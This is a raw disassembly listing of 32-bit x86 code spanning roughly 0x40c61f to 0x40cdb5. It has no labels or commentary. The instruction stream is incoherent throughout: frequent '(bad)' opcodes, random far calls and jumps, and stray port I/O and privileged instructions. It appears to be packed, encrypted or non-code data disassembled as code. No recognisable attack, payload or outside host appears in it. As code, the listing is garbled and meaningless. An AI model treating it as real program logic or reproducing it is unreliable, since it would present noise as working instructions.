  40c61f:	nop
  40c620:	or     bl,BYTE PTR [edx]
  40c622:	mov    WORD PTR [ecx+edx*2+0x75d46360],cs
  40c629:	clc    
  40c62a:	imul   ebx,DWORD PTR [edx+0x68],0x62
  40c62e:	ds loopne 0x40c621
  40c631:	(bad)  
  40c633:	xor    al,BYTE PTR [esi+0x29]
  40c636:	or     al,0x73
  40c638:	xor    ecx,DWORD PTR [edi+edx*1]
  40c63b:	cmp    BYTE PTR [ebx],al
  40c63d:	push   0x412acae1
  40c642:	xor    DWORD PTR [edi-0x69],ebx
  40c645:	adc    al,0xb1
  40c647:	ror    DWORD PTR [ebx],1
  40c649:	push   es
  40c64a:	xor    edi,edx
  40c64c:	cmp    edi,DWORD PTR [ecx]
  40c64e:	inc    eax
  40c64f:	mov    bh,BYTE PTR [ebp-0x79ebd4c]
  40c655:	ins    BYTE PTR es:[edi],dx
  40c656:	out    0x92,eax
  40c658:	not    BYTE PTR [ebx]
  40c65a:	lea    eax,[ebp-0x4a]
  40c65d:	xchg   BYTE PTR [esp+eax*2+0x40],cl
  40c661:	or     eax,0x38456b63
  40c666:	aaa    
  40c667:	ret    0x639c
  40c66a:	shr    ch,0x81
  40c66d:	dec    edx
  40c66e:	cld    
  40c66f:	pop    esp
  40c670:	pop    ebx
  40c671:	or     BYTE PTR [ebx],ah
  40c673:	icebp  
  40c674:	imul   esp,DWORD PTR [esi+0x25ceb32d],0xffffffec
  40c67b:	das    
  40c67c:	add    edi,ebx
  40c67e:	mov    eax,0xdcc07f03
  40c683:	test   BYTE PTR [esi+0x38],dl
  40c686:	adc    dl,BYTE PTR [esi]
  40c688:	sbb    BYTE PTR [edx-0x7f],0x3e
  40c68c:	pop    ebp
  40c68d:	push   ss
  40c68e:	or     DWORD PTR [ecx],edx
  40c690:	jne    0x40c66b
  40c692:	and    BYTE PTR [ebx],dh
  40c694:	cmp    DWORD PTR [ebp+0x58],ecx
  40c697:	out    0xd7,al
  40c699:	(bad)  
  40c69a:	sub    BYTE PTR [ecx],bl
  40c69c:	(bad)  
  40c69d:	push   0x37
  40c69f:	add    al,0x2f
  40c6a1:	stos   BYTE PTR es:[edi],al
  40c6a2:	xchg   DWORD PTR [ecx+ebp*1-0x7c],ebp
  40c6a6:	jmp    0x40c6fb
  40c6a8:	sti    
  40c6a9:	inc    esi
  40c6aa:	test   BYTE PTR [esp+esi*8],dh
  40c6ad:	les    edx,FWORD PTR [edi-0x51cf5cdc]
  40c6b3:	dec    ebx
  40c6b4:	mov    eax,0x8adee37a
  40c6b9:	and    al,0x4b
  40c6bb:	cmp    DWORD PTR [edx-0x6721e6fd],ecx
  40c6c1:	mov    ah,BYTE PTR [ecx-0x732af368]
  40c6c7:	(bad)  
  40c6c9:	call   0x196c:0x78620e09
  40c6d0:	sar    DWORD PTR [edx-0x28],1
  40c6d3:	ror    DWORD PTR [edi+eiz*8-0x423df8af],cl
  40c6da:	push   esi
  40c6db:	mov    edi,0xd8aa8b7
  40c6e0:	or     al,0xab
  40c6e2:	frstpm(287 only) 
  40c6e4:	retf   
  40c6e5:	xor    BYTE PTR [ecx-0x3769c002],0x1b
  40c6ec:	mov    bh,0x45
  40c6ee:	or     eax,ebp
  40c6f0:	or     al,0xa7
  40c6f2:	push   esp
  40c6f3:	clc    
  40c6f4:	lock clc 
  40c6f6:	push   esp
  40c6f7:	adc    bh,BYTE PTR [ebx+0x30dc5889]
  40c6fd:	fidiv  DWORD PTR [ebx-0x1a85be8e]
  40c703:	stos   DWORD PTR es:[edi],eax
  40c704:	add    al,bh
  40c706:	adc    eax,0x75293335
  40c70b:	jp     0x40c6bd
  40c70d:	imul   edi,DWORD PTR [edx],0xfffffffe
  40c710:	sbb    BYTE PTR [edi+esi*2],dl
  40c713:	cli    
  40c714:	xor    al,0xa8
  40c716:	or     DWORD PTR [eax+0x36a27474],edi
  40c71c:	inc    ebp
  40c71d:	xchg   edi,eax
  40c71e:	out    dx,eax
  40c71f:	retf   
  40c720:	dec    esi
  40c721:	pop    DWORD PTR [ebx-0x6e19a798]
  40c727:	adc    eax,0x46e6c346
  40c72c:	cmp    eax,0xe86edf74
  40c731:	add    ebx,0xe62b5df2
  40c737:	inc    edi
  40c738:	jp     0x40c717
  40c73a:	lods   eax,DWORD PTR ds:[esi]
  40c73b:	aas    
  40c73c:	mov    ds:0xc18c9c4,al
  40c741:	pop    ss
  40c742:	lds    edi,FWORD PTR [esi+0x118c2f30]
  40c748:	xchg   esp,eax
  40c749:	sub    DWORD PTR ds:0xfad00944,esp
  40c74f:	repz (bad) 
  40c751:	in     eax,0xc0
  40c753:	out    0x4d,al
  40c755:	hlt    
  40c756:	imul   ebp,DWORD PTR [esi-0x50c59f3b],0x49
  40c75d:	adc    ebp,edi
  40c75f:	rcl    BYTE PTR [eax+ebx*1],1
  40c762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c763:	retf   
  40c764:	cmp    al,0x4b
  40c766:	out    dx,eax
  40c767:	and    eax,0x8d0b3b04
  40c76c:	(bad)  
  40c76f:	ficom  DWORD PTR [ecx+0x1d]
  40c772:	in     eax,0x2b
  40c774:	sbb    BYTE PTR [ebp+0x7f93cc1b],ah
  40c77a:	cwde   
  40c77b:	aam    0xae
  40c77d:	pop    ds
  40c77e:	sbb    edx,edx
  40c780:	sar    dl,cl
  40c782:	sti    
  40c783:	adc    al,0x6e
  40c785:	sub    eax,0xc7872cdd
  40c78a:	mov    ch,0xb1
  40c78c:	push   ss
  40c78d:	xor    al,0x88
  40c78f:	jno    0x40c771
  40c791:	xor    al,0xce
  40c793:	inc    ecx
  40c794:	fiadd  WORD PTR [edi+0x1d9d53a5]
  40c79a:	pop    edx
  40c79b:	in     eax,0xf3
  40c79d:	mov    edx,ds
  40c79f:	push   eax
  40c7a0:	push   ebx
  40c7a1:	stc    
  40c7a2:	mov    eax,DWORD PTR [ebp-0x7c284c72]
  40c7a8:	bound  ebx,QWORD PTR [esi+0x64f95e7b]
  40c7ae:	bound  esp,QWORD PTR [edi]
  40c7b0:	dec    ebx
  40c7b1:	js     0x40c789
  40c7b3:	mov    ebx,0x76789066
  40c7b8:	mov    DWORD PTR [edx],ebp
  40c7ba:	adc    DWORD PTR [eax+ebx*4],edx
  40c7bd:	aaa    
  40c7be:	(bad)  
  40c7bf:	jmp    0x5ad58ac9
  40c7c4:	(bad)  
  40c7c5:	or     eax,0x950f7b83
  40c7ca:	pop    edi
  40c7cb:	loopne 0x40c7aa
  40c7cd:	sub    ebx,DWORD PTR [ecx+0x6e]
  40c7d0:	mov    edi,0xeca4a04b
  40c7d5:	outs   dx,DWORD PTR ds:[esi]
  40c7d6:	cmp    eax,0x3e758676
  40c7db:	inc    edx
  40c7dc:	pop    eax
  40c7dd:	(bad)  
  40c7de:	mov    dl,0x2d
  40c7e0:	and    BYTE PTR [esi+0x33],al
  40c7e3:	cmp    DWORD PTR [edx],esi
  40c7e5:	ror    DWORD PTR [eax+0xd6e3e79],0x6c
  40c7ec:	lods   al,BYTE PTR ds:[esi]
  40c7ed:	inc    ebp
  40c7ee:	pop    edi
  40c7ef:	inc    eax
  40c7f0:	mov    ecx,0x8ef30eaf
  40c7f5:	or     ebx,esi
  40c7f7:	adc    al,0x8e
  40c7f9:	and    ch,0x68
  40c7fc:	xchg   DWORD PTR [eax],esp
  40c7fe:	sbb    al,0x2a
  40c800:	xchg   ecx,eax
  40c801:	sub    ch,bl
  40c803:	(bad)  
  40c804:	jmp    0x87ca:0x4dfc7617
  40c80b:	lock loopne 0x40c88d
  40c80e:	lock add eax,0x798e4da7
  40c814:	je     0xb537fb1d
  40c81a:	das    
  40c81b:	in     eax,0x7e
  40c81d:	or     BYTE PTR [eax],bl
  40c81f:	data16 clc 
  40c821:	fistp  WORD PTR [edx+0x5971ae3f]
  40c827:	cmp    bh,BYTE PTR [ebx-0x4d]
  40c82a:	sbb    ah,BYTE PTR [ecx-0x6e]
  40c82d:	dec    ebp
  40c82e:	cli    
  40c82f:	mov    DWORD PTR [edx],ebx
  40c831:	rcl    ebx,cl
  40c833:	or     eax,0x3a6b85a5
  40c838:	cwde   
  40c839:	pop    ecx
  40c83a:	sub    edx,DWORD PTR [edi*2-0x60706c9b]
  40c841:	dec    ebx
  40c842:	outs   dx,DWORD PTR ds:[esi]
  40c843:	rcl    ah,cl
  40c845:	fmul   DWORD PTR [edx+ecx*2+0x135b3fd1]
  40c84c:	cmc    
  40c84d:	mov    ebp,ecx
  40c84f:	nop
  40c850:	aas    
  40c851:	sub    eax,0xf21aab4f
  40c856:	test   al,bh
  40c858:	fisubr DWORD PTR [eax]
  40c85a:	scas   eax,DWORD PTR es:[edi]
  40c85b:	pop    ebx
  40c85c:	inc    esi
  40c85d:	frstor [edx-0x48]
  40c860:	mov    esp,0x76b95f83
  40c865:	jne    0x40c8d8
  40c867:	sbb    bl,dl
  40c869:	mov    ebp,esp
  40c86b:	inc    edx
  40c86c:	outs   dx,BYTE PTR ds:[esi]
  40c86d:	pop    esp
  40c86e:	push   eax
  40c86f:	out    0x81,eax
  40c871:	addr16 repnz das 
  40c874:	out    0xa2,al
  40c876:	lahf   
  40c877:	adc    DWORD PTR [edx-0x6c],esp
  40c87a:	jnp    0x40c8dc
  40c87c:	(bad)  
  40c87d:	fist   DWORD PTR [edi-0x1d83a2b5]
  40c883:	lods   al,BYTE PTR ds:[esi]
  40c884:	mov    DWORD PTR [edi],esi
  40c886:	or     ch,bl
  40c888:	mov    edi,0x78bf6252
  40c88d:	push   edi
  40c88e:	dec    esp
  40c88f:	jb     0x40c878
  40c891:	sub    eax,0x4d66a0e
  40c896:	aaa    
  40c897:	push   esi
  40c898:	xchg   edi,eax
  40c899:	and    ebp,ebx
  40c89b:	pop    ebx
  40c89c:	or     DWORD PTR [edx+0x1925afb4],ebx
  40c8a2:	enter  0xfdf3,0xe8
  40c8a6:	scas   eax,DWORD PTR es:[edi]
  40c8a7:	ins    BYTE PTR es:[edi],dx
  40c8a8:	test   eax,0x57b65da3
  40c8ad:	xor    edi,ecx
  40c8af:	sub    al,0x18
  40c8b1:	xlat   BYTE PTR ds:[ebx]
  40c8b2:	push   0x220cfe8
  40c8b7:	cmp    eax,0xac044101
  40c8bc:	adc    eax,0xcfa874c2
  40c8c1:	loope  0x40c8d3
  40c8c3:	call   0x499efea2
  40c8c8:	push   edi
  40c8c9:	retf   0xc464
  40c8cc:	mov    al,ds:0xddcd142a
  40c8d1:	and    bh,BYTE PTR [ebp+0x76960d75]
  40c8d7:	jg     0x40c8ac
  40c8d9:	sbb    al,0x11
  40c8db:	or     BYTE PTR [ebx+0x20],ah
  40c8de:	bound  edx,QWORD PTR [edx-0x7d614188]
  40c8e4:	mov    esi,0x579fa8a9
  40c8e9:	push   esi
  40c8ea:	mov    eax,0xb165432d
  40c8ef:	inc    esi
  40c8f0:	mov    ah,0x6a
  40c8f2:	test   BYTE PTR [esi+0x7e],0xd6
  40c8f6:	jae    0x40c8e1
  40c8f8:	shl    BYTE PTR [esi+0x54],0x63
  40c8fc:	sti    
  40c8fd:	pusha  
  40c8fe:	pop    esi
  40c8ff:	jo     0x40c91e
  40c901:	les    edi,FWORD PTR [ebx]
  40c903:	in     eax,dx
  40c904:	fldenv [edx+0x65]
  40c907:	ret    0x2571
  40c90a:	lds    ebx,FWORD PTR [ecx]
  40c90c:	ds inc esi
  40c90e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90f:	call   0x54c3eb3
  40c914:	jp     0x40c8bd
  40c916:	sub    eax,0x9d1989a6
  40c91b:	fmul   QWORD PTR [ecx-0x39]
  40c91e:	inc    esi
  40c91f:	fld    DWORD PTR [ebx+0x3ad1f68e]
  40c925:	fst    DWORD PTR [edi]
  40c927:	scas   eax,DWORD PTR es:[edi]
  40c928:	dec    esp
  40c929:	xor    BYTE PTR [edx+0x63],bh
  40c92c:	pop    ds
  40c92d:	pop    es
  40c92e:	xchg   ebp,eax
  40c92f:	and    ebp,ecx
  40c931:	repz or al,0x5b
  40c934:	pusha  
  40c935:	popa   
  40c936:	call   0xd15c8536
  40c93b:	inc    edx
  40c93c:	pop    ebx
  40c93d:	mov    esp,0xc38518f4
  40c942:	fcomp  DWORD PTR [eax+0x65]
  40c945:	jmp    0x40c9b8
  40c947:	in     eax,dx
  40c948:	imul   ecx,DWORD PTR [ecx],0xffffffcf
  40c94b:	dec    edi
  40c94c:	add    al,0x47
  40c94e:	add    al,0x2d
  40c950:	jle    0x40c99a
  40c952:	rol    DWORD PTR [ebx-0x5f],0xd0
  40c956:	(bad)  
  40c957:	lds    ebx,FWORD PTR [ecx+ebp*8+0x11]
  40c95b:	sub    ebp,0x3c
  40c95e:	jmp    0x39c30576
  40c963:	fadd   DWORD PTR [esi-0x56]
  40c966:	scas   al,BYTE PTR es:[edi]
  40c967:	imul   ebp,DWORD PTR [esi],0xffffffae
  40c96a:	test   BYTE PTR [edx+0x10],0x66
  40c96e:	(bad)  
  40c96f:	retf   0x41a5
  40c972:	mov    dh,0xf7
  40c974:	call   0x9e77:0x85a07e0c
  40c97b:	xchg   esp,eax
  40c97c:	cmp    ebx,eax
  40c97e:	mov    dl,0x2c
  40c980:	ret    
  40c981:	pop    esp
  40c982:	sbb    dl,bl
  40c984:	and    eax,0xb78ca36a
  40c989:	inc    ecx
  40c98a:	test   al,0x3
  40c98c:	add    cl,BYTE PTR [edi+0x27]
  40c98f:	or     DWORD PTR [eax+0x3e294c20],edx
  40c995:	shl    DWORD PTR [edx-0x3268bddb],cl
  40c99b:	fcmovnb st,st(1)
  40c99d:	jno    0x40c9e8
  40c99f:	(bad)  
  40c9a0:	xlat   BYTE PTR ds:[ebx]
  40c9a1:	xor    ebp,DWORD PTR ds:0xe1858e57
  40c9a7:	ror    BYTE PTR [edi-0x7351a09a],0x94
  40c9ae:	(bad)  
  40c9af:	fld1   
  40c9b1:	ror    edx,0xa2
  40c9b4:	inc    eax
  40c9b5:	sbb    BYTE PTR ds:0xb36f3f3,0xac
  40c9bc:	dec    edi
  40c9bd:	ret    
  40c9be:	or     esi,DWORD PTR [ebx]
  40c9c0:	xor    esp,0x72c7a65a
  40c9c6:	(bad)  
  40c9c7:	addr16 aas 
  40c9c9:	add    ah,ch
  40c9cb:	push   ebx
  40c9cc:	push   ecx
  40c9cd:	test   esp,edi
  40c9cf:	popf   
  40c9d0:	daa    
  40c9d1:	fsub   DWORD PTR [edx]
  40c9d3:	push   ebx
  40c9d4:	in     eax,dx
  40c9d5:	pop    es
  40c9d6:	and    dl,BYTE PTR [esi+0x543d407c]
  40c9dc:	mov    bh,BYTE PTR [edi+edx*4-0x6292d615]
  40c9e3:	out    dx,eax
  40c9e4:	rcl    DWORD PTR [ebx],cl
  40c9e6:	xor    al,0x7b
  40c9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e9:	xchg   DWORD PTR ds:0xb27f7e50,edi
  40c9ef:	and    al,0x87
  40c9f1:	mov    bh,0xd9
  40c9f3:	or     eax,0xb9ba7880
  40c9f8:	dec    edi
  40c9f9:	cmc    
  40c9fa:	xor    edx,ecx
  40c9fc:	jmp    FWORD PTR [esi+0x41ac7e1a]
  40ca02:	(bad)  
  40ca03:	das    
  40ca04:	aas    
  40ca05:	dec    edi
  40ca06:	inc    ebx
  40ca07:	mov    ah,0xd9
  40ca09:	test   BYTE PTR [ecx-0x3d],ah
  40ca0c:	int3   
  40ca0d:	dec    ebx
  40ca0e:	jns    0x40ca2f
  40ca10:	xor    al,0xbd
  40ca12:	dec    edx
  40ca13:	aad    0xe5
  40ca15:	adc    DWORD PTR [ebp-0x17e6e3d1],eax
  40ca1b:	div    DWORD PTR [edi]
  40ca1d:	and    BYTE PTR [esi-0x46b2f9d9],bl
  40ca23:	xor    ch,BYTE PTR [ebp+0x6f]
  40ca26:	icebp  
  40ca27:	dec    esi
  40ca28:	mov    eax,DWORD PTR [esi-0x598d409b]
  40ca2e:	bound  ebx,QWORD PTR [eax+0x1671ad9f]
  40ca34:	xor    BYTE PTR [edi-0x62126e74],ch
  40ca3a:	jnp    0x40ca28
  40ca3c:	fadd   st(4),st
  40ca3e:	arpl   WORD PTR ds:0x41973a82,bp
  40ca44:	jl     0x40ca21
  40ca46:	mov    eax,0xe462a94d
  40ca4b:	repz add eax,0x33300b7c
  40ca51:	clc    
  40ca52:	mov    ch,0xfc
  40ca54:	pop    edi
  40ca55:	add    BYTE PTR [ecx-0x38],ah
  40ca58:	nop
  40ca59:	cmp    DWORD PTR [edi],0x5e
  40ca5c:	adc    al,0x20
  40ca5e:	out    dx,eax
  40ca5f:	sub    eax,0x5864c24
  40ca64:	addr16 inc eax
  40ca66:	push   es
  40ca67:	mov    esp,0x5c0147d3
  40ca6c:	inc    ecx
  40ca6d:	jecxz  0x40ca91
  40ca6f:	inc    ebx
  40ca70:	sbb    cl,BYTE PTR [ebp+0x6c]
  40ca73:	fnstsw WORD PTR [edi+0x601079e9]
  40ca79:	ins    BYTE PTR es:[edi],dx
  40ca7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca7b:	adc    ah,BYTE PTR [esi]
  40ca7d:	les    eax,FWORD PTR [edx+0x6c]
  40ca80:	ror    ecx,cl
  40ca82:	and    eax,DWORD PTR [ebx+edi*4]
  40ca85:	outs   dx,DWORD PTR ds:[esi]
  40ca86:	mov    esi,0x478472c
  40ca8b:	(bad)  
  40ca8c:	jne    0x40cac7
  40ca8e:	xchg   esp,eax
  40ca8f:	ins    DWORD PTR es:[edi],dx
  40ca90:	mov    eax,ds:0x62ef4cfc
  40ca95:	xor    DWORD PTR [ebx+0x1b],ebx
  40ca98:	in     eax,dx
  40ca99:	mov    bl,0xb1
  40ca9b:	in     al,dx
  40ca9c:	fmul   st(2),st
  40ca9e:	xor    BYTE PTR [eax],ah
  40caa0:	add    esi,DWORD PTR [ebx]
  40caa2:	fild   QWORD PTR [edx]
  40caa4:	mov    ds,WORD PTR [esi-0x461dcb8e]
  40caaa:	mov    esp,0xbe5f6f04
  40caaf:	sbb    BYTE PTR [eax+0x28],dl
  40cab2:	gs icebp 
  40cab4:	mov    bl,0x8e
  40cab6:	xchg   esi,eax
  40cab7:	xor    bh,cl
  40cab9:	out    dx,eax
  40caba:	aaa    
  40cabb:	arpl   WORD PTR [ebp-0x78],sp
  40cabe:	inc    esi
  40cabf:	lock push ecx
  40cac1:	sub    al,0xde
  40cac3:	call   0x4e7f:0xa8056802
  40caca:	cli    
  40cacb:	push   eax
  40cacc:	sbb    bl,0xfb
  40cacf:	dec    esi
  40cad0:	and    eax,0xe91fbca7
  40cad5:	push   ds
  40cad6:	add    al,0xc0
  40cad8:	pop    ds
  40cad9:	xchg   DWORD PTR [esi+0x32f43840],edi
  40cadf:	add    eax,0xa83776db
  40cae4:	aas    
  40cae5:	shl    ch,0x9
  40cae8:	dec    ebx
  40cae9:	(bad)  
  40caeb:	test   dl,cl
  40caed:	scas   al,BYTE PTR es:[edi]
  40caee:	stos   DWORD PTR es:[edi],eax
  40caef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf0:	jg     0x40cafb
  40caf2:	sub    al,0x23
  40caf4:	sbb    dh,BYTE PTR [edx+0x45e76f90]
  40cafa:	xor    BYTE PTR [eax],ah
  40cafc:	pop    ecx
  40cafd:	xor    ah,BYTE PTR [edx-0x27b9d2b7]
  40cb03:	fiadd  WORD PTR [esi+0x46]
  40cb06:	jo     0x40cb19
  40cb08:	xchg   ebx,eax
  40cb09:	jl     0x40cb89
  40cb0b:	sti    
  40cb0c:	sub    bl,BYTE PTR [ebx+eiz*8-0x34]
  40cb10:	fidiv  WORD PTR [ecx+0x2688085e]
  40cb16:	aad    0x4c
  40cb18:	cli    
  40cb19:	call   0x7205:0xcf75cf03
  40cb20:	and    DWORD PTR [edx+0x3d1e4545],0xffffffc7
  40cb27:	arpl   WORD PTR [eax-0x8],si
  40cb2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb2b:	lahf   
  40cb2c:	into   
  40cb2d:	mov    ebx,0x44310491
  40cb32:	adc    edi,eax
  40cb34:	rol    DWORD PTR [edi-0x65],cl
  40cb37:	mov    al,ds:0xb447e748
  40cb3c:	fistp  DWORD PTR gs:[esp+ecx*2+0x58ab7327]
  40cb44:	(bad)  
  40cb45:	in     eax,0xf6
  40cb47:	rcr    BYTE PTR [ecx+0xe7f11ee],0x7a
  40cb4e:	mov    esp,0xbaac61fa
  40cb53:	or     eax,0x75d44937
  40cb58:	jbe    0x40cae9
  40cb5a:	jle    0x40cb43
  40cb5c:	les    ebp,FWORD PTR [edi+ebp*1+0x4662b4ad]
  40cb63:	test   eax,0x8d9f52b8
  40cb68:	cmc    
  40cb69:	leave  
  40cb6a:	or     BYTE PTR [edi-0x44613e92],dh
  40cb70:	jmp    0xca5f8ea7
  40cb75:	les    ebp,FWORD PTR [esi]
  40cb77:	mov    eax,ds:0xba87b891
  40cb7c:	jl     0x40cb23
  40cb7e:	cmc    
  40cb7f:	mov    eax,0xe30c6c58
  40cb84:	nop
  40cb85:	mov    esi,0x37feba3e
  40cb8a:	adc    dh,dl
  40cb8c:	dec    ecx
  40cb8d:	rcl    DWORD PTR ds:0x178efb46,0xb2
  40cb94:	cld    
  40cb95:	shr    BYTE PTR [edi+0x30],0xc0
  40cb99:	jbe    0x40cb97
  40cb9b:	and    DWORD PTR [esi-0x7e],0x5d
  40cb9f:	dec    esi
  40cba0:	daa    
  40cba1:	inc    esi
  40cba2:	push   esi
  40cba3:	mov    eax,0xbe7befcd
  40cba8:	in     al,0x9c
  40cbaa:	or     al,0x5d
  40cbac:	inc    esp
  40cbad:	adc    eax,0xf1c89d68
  40cbb2:	fwait
  40cbb3:	inc    edx
  40cbb4:	add    BYTE PTR ds:0x8b559feb,bh
  40cbba:	f2xm1  
  40cbbc:	xchg   BYTE PTR [edi-0x51],bh
  40cbbf:	stc    
  40cbc0:	(bad)  
  40cbc1:	push   cs
  40cbc2:	or     edi,0x8faf8d38
  40cbc8:	mov    cl,0x76
  40cbca:	inc    ecx
  40cbcb:	icebp  
  40cbcc:	push   cs
  40cbcd:	xchg   ebx,eax
  40cbce:	sub    BYTE PTR [edi+0x55ae1568],bl
  40cbd4:	out    0x5b,eax
  40cbd6:	push   eax
  40cbd7:	sbb    al,0x55
  40cbd9:	adc    al,0xa9
  40cbdb:	mov    ch,dl
  40cbdd:	adc    al,BYTE PTR [ebp+0x5c7c059]
  40cbe3:	jbe    0x40cb8d
  40cbe5:	pusha  
  40cbe6:	lods   eax,DWORD PTR ds:[esi]
  40cbe7:	fimul  DWORD PTR [ebx+0xb]
  40cbea:	fdiv   DWORD PTR [edx+0x51]
  40cbed:	inc    edx
  40cbee:	xor    al,0xf1
  40cbf0:	fst    DWORD PTR [eax]
  40cbf2:	xchg   esp,eax
  40cbf3:	xlat   BYTE PTR ds:[ebx]
  40cbf4:	loope  0x40cb94
  40cbf6:	jle    0x40cb7d
  40cbf8:	int    0xde
  40cbfa:	adc    ecx,DWORD PTR [edx-0x7fdde13e]
  40cc00:	aas    
  40cc01:	xchg   BYTE PTR [ecx+eax*1-0x2023bf00],bl
  40cc08:	mov    dl,0xb9
  40cc0a:	shr    dh,1
  40cc0c:	add    DWORD PTR [eax+0x3c],esi
  40cc0f:	std    
  40cc10:	fsub   QWORD PTR [edi]
  40cc12:	pop    ebx
  40cc13:	retf   
  40cc14:	lds    edi,FWORD PTR [edx+esi*2]
  40cc17:	ins    BYTE PTR es:[edi],dx
  40cc18:	push   esi
  40cc19:	pop    ss
  40cc1a:	pop    eax
  40cc1b:	out    0xe9,eax
  40cc1d:	out    0x7f,al
  40cc1f:	scas   al,BYTE PTR es:[edi]
  40cc20:	cli    
  40cc21:	stos   DWORD PTR es:[edi],eax
  40cc22:	jle    0x40cc56
  40cc24:	mov    ch,0x49
  40cc26:	jne    0x40cc24
  40cc28:	push   ds
  40cc29:	or     bl,BYTE PTR [ecx+0x63]
  40cc2c:	fstp   QWORD PTR [ebp+edx*4+0x4438171e]
  40cc33:	ja     0x40cc7b
  40cc35:	xor    eax,0xb131de72
  40cc3a:	mov    ebp,0xb6b27a22
  40cc3f:	adc    al,0xa8
  40cc41:	jge    0x40cbd2
  40cc43:	into   
  40cc44:	mov    ebp,0x83465f50
  40cc49:	pop    ds
  40cc4a:	int    0x3f
  40cc4c:	aaa    
  40cc4d:	into   
  40cc4e:	and    dl,dh
  40cc50:	lock fucom st(5)
  40cc53:	leave  
  40cc54:	xor    al,0xef
  40cc56:	lahf   
  40cc57:	mov    eax,0x3411b7ad
  40cc5c:	(bad)  
  40cc5d:	cli    
  40cc5e:	push   ecx
  40cc5f:	shl    BYTE PTR [edx-0x2e],cl
  40cc62:	sbb    dl,BYTE PTR [ecx+0x65]
  40cc65:	add    ebx,esp
  40cc67:	mov    dh,0x8d
  40cc69:	and    al,0xb4
  40cc6b:	xchg   edi,eax
  40cc6c:	shl    BYTE PTR [edx],cl
  40cc6e:	jmp    0xb53837a4
  40cc73:	xor    eax,0x21f4ef93
  40cc78:	push   0xfcb8012f
  40cc7d:	mov    ebp,0x5f9515df
  40cc82:	jge    0x40cc7e
  40cc84:	(bad)  
  40cc85:	and    DWORD PTR [edx+0x66ce25f2],edi
  40cc8b:	sbb    edi,DWORD PTR [esp+esi*2-0x2b]
  40cc8f:	pop    ds
  40cc90:	imul   DWORD PTR [edx+eax*4+0x68791946]
  40cc97:	cs das 
  40cc99:	fsubr  DWORD PTR [esp+eax*1+0x7ccff5c0]
  40cca0:	daa    
  40cca1:	ret    
  40cca2:	sub    eax,0x978b4092
  40cca7:	mov    ecx,0xcfc28c30
  40ccac:	jle    0x40cca3
  40ccae:	cmp    eax,0xc142fafd
  40ccb3:	ss inc esi
  40ccb5:	out    dx,eax
  40ccb6:	mov    ebx,0x1443168f
  40ccbb:	repnz int 0x4f
  40ccbe:	je     0x40ccf0
  40ccc0:	loope  0x40ccc1
  40ccc2:	jo     0x40cc4e
  40ccc4:	call   0x9c92:0x8f33bfdc
  40cccb:	ins    BYTE PTR es:[edi],dx
  40cccc:	bound  esi,QWORD PTR [edx]
  40ccce:	fwait
  40cccf:	test   DWORD PTR [edx+0x74],eax
  40ccd2:	push   esp
  40ccd3:	std    
  40ccd4:	int    0x1e
  40ccd6:	int    0x7e
  40ccd8:	sbb    cl,BYTE PTR [edx-0x5a0b3f98]
  40ccde:	and    ebp,DWORD PTR [edx+esi*4-0x2d]
  40cce2:	in     eax,dx
  40cce3:	xchg   ebx,eax
  40cce4:	stos   BYTE PTR es:[edi],al
  40cce5:	or     DWORD PTR [ebp+0x31],esp
  40cce8:	sub    eax,0x7faa435f
  40cced:	inc    edx
  40ccee:	inc    edx
  40ccef:	out    dx,eax
  40ccf0:	mov    ah,0x8d
  40ccf2:	loope  0x40ccd4
  40ccf4:	pop    ds
  40ccf5:	jne    0x40ccd6
  40ccf7:	fist   WORD PTR [esi]
  40ccf9:	call   0x4b73:0xad9e0612
  40cd00:	test   al,0xab
  40cd02:	in     eax,0xc7
  40cd04:	std    
  40cd05:	xchg   ebp,eax
  40cd06:	rcr    BYTE PTR [ebx-0x1dc3a6a9],0xfd
  40cd0d:	xor    DWORD PTR [ebp-0x6748b505],ebx
  40cd13:	xor    dl,BYTE PTR [edi+0x19]
  40cd16:	mov    edi,0xd1630bc5
  40cd1b:	sub    eax,0x3c1b221f
  40cd20:	mov    ebx,0x18732407
  40cd25:	xor    BYTE PTR [eax],ah
  40cd27:	inc    esi
  40cd28:	jns    0x40cd42
  40cd2a:	add    BYTE PTR [esi+ecx*2+0x2d],ah
  40cd2e:	ins    DWORD PTR es:[edi],dx
  40cd2f:	push   edx
  40cd30:	stos   DWORD PTR es:[edi],eax
  40cd31:	in     eax,0x7
  40cd33:	loope  0x40ccf3
  40cd35:	adc    ch,bh
  40cd37:	mov    ebx,0x32182ac
  40cd3c:	repz sbb bl,bl
  40cd3f:	pop    esi
  40cd40:	addr16 jmp 0x4b3de350
  40cd46:	xor    al,0x15
  40cd48:	mov    bl,0x59
  40cd4a:	(bad)  
  40cd4b:	test   eax,0xe5cb2b20
  40cd50:	(bad)  
  40cd51:	pop    eax
  40cd52:	gs stc 
  40cd54:	in     al,dx
  40cd55:	out    dx,al
  40cd56:	xor    ebx,DWORD PTR [esi+0xd]
  40cd59:	repnz adc bl,cl
  40cd5c:	mov    edi,0xf318f5af
  40cd61:	or     DWORD PTR [edi+ebp*1-0x1a891024],esp
  40cd68:	(bad)  
  40cd69:	or     eax,0xdc675558
  40cd6e:	pop    esp
  40cd6f:	jl     0x40cd8f
  40cd71:	mov    ds:0x81cb8f42,al
  40cd76:	test   DWORD PTR [edi],0xf8027958
  40cd7c:	sbb    esi,DWORD PTR [esi-0x42]
  40cd7f:	stos   DWORD PTR es:[edi],eax
  40cd80:	in     eax,0x57
  40cd82:	dec    eax
  40cd83:	test   DWORD PTR [eax-0x705e494c],ecx
  40cd89:	push   es
  40cd8a:	jp     0x40cd6f
  40cd8c:	dec    esi
  40cd8d:	lds    ebp,FWORD PTR [edi+eax*4-0x64]
  40cd91:	fmul   DWORD PTR [ebx+0x4b4cd70c]
  40cd97:	scas   eax,DWORD PTR es:[edi]
  40cd98:	fdiv   st(0),st
  40cd9a:	loopne 0x40cd4e
  40cd9c:	or     al,0xf1
  40cd9e:	(bad)  
  40cd9f:	fdivr  st,st(3)
  40cda1:	mov    edi,0x87a1d4e3
  40cda7:	(bad)  ds:0x29c593c5
  40cdad:	arpl   WORD PTR [ebx+0x4ebef963],di
  40cdb3:	sub    ebp,ebx
  40cdb5:	cmp    BYTE PTR [edi],0x38
